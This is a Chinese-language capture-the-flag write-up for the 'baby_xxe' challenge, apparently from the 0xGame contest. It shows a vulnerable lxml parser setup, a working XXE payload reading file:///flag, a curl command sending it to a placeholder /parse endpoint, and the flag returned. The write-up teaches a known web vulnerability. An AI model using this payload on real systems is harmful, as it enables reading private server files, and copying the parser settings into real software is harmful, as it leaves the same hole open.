# baby_xxe

## 题目简述

`/parse` 接收表单字段 `xml`，并使用启用了 DTD 加载和实体解析的 lxml 解析器。响应会返回根节点下 `<name>` 的文本，因此可以定义外部实体读取容器中的 `/flag`。

## 解题过程

服务端的关键配置是：

```python
parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
root = etree.fromstring(xml, parser)
name = root.find("name").text
return name or None
```

`load_dtd=True` 允许加载 DTD，`resolve_entities=True` 会把实体引用替换为实体内容。构造一个指向本地文件的外部实体，并在 `<name>` 中引用：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>
  <name>&xxe;</name>
</root>
```

将完整 XML 作为 `xml` 表单字段提交到 `/parse`：

```bash
curl -s -X POST \
  --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///flag">]><root><name>&xxe;</name></root>' \
  'http://TARGET/parse'
```

实体展开后的 `<name>` 文本就是响应内容：

```text
0xGame{114514_XXE_114514_XXE}
```

## 方法总结

本题形成 XXE 的三个条件是：攻击者可控 XML、解析器允许 DTD、解析器解析外部实体。由于实体内容被放进会回显的 `<name>` 节点，直接使用 `file:///flag` 即可完成有回显文件读取。
